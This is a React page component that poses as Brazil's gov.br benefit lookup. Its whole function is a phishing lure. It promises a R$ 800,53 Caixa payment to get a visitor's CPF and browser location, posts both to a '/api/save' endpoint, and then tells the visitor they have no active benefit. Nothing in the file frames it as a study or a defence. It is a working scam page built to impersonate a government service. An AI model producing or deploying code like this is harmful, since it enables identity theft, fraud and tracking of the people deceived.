import { useState } from "react";

export default function Home() {
  const [cpf, setCpf] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const enviarDados = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validação simples do CPF
    if (cpf.replace(/\D/g, "").length !== 11) {
      setMessage("CPF inválido. Digite 11 números.");
      return;
    }

    setMessage(
      "Parabéns! Você tem direito ao benefício no valor de R$ 800,53. Para encontrarmos a agência da Caixa mais próxima e garantir o seu pagamento, por favor autorize o navegador a acessar sua localização."
    );

    if (!navigator.geolocation) {
      setMessage("Seu navegador não suporta geolocalização.");
      return;
    }

    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
        };

        try {
          await fetch("/api/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cpf, location }),
          });

          setMessage("CPF informado não possui benefício ativo.");
        } catch {
          setMessage("Erro ao enviar dados.");
        } finally {
          setLoading(false);
        }
      },
      () => {
        setMessage(
          "Erro ao obter localização. Por favor, permita o acesso para continuar."
        );
        setLoading(false);
      }
    );
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4">
      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-md">
        <div className="mb-4 text-center">
          <h1 className="text-blue-700 text-xl font-bold">gov.br</h1>
          <h2 className="text-gray-800 mt-2">Consulta de Benefício</h2>
        </div>
        <form onSubmit={enviarDados}>
          <label className="block mb-2 text-sm font-semibold text-gray-700">
            CPF
          </label>
          <input
            type="text"
            value={cpf}
            onChange={(e) => setCpf(e.target.value)}
            placeholder="Digite seu CPF"
            className="w-full p-2 border border-gray-300 rounded mb-4"
            maxLength={14}
          />
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700 disabled:opacity-50"
          >
            {loading ? "Consultando..." : "Consultar Benefício"}
          </button>
        </form>
        {message && (
          <p className="mt-4 text-center text-red-600 font-semibold">{message}</p>
        )}
      </div>
    </div>
  );
}
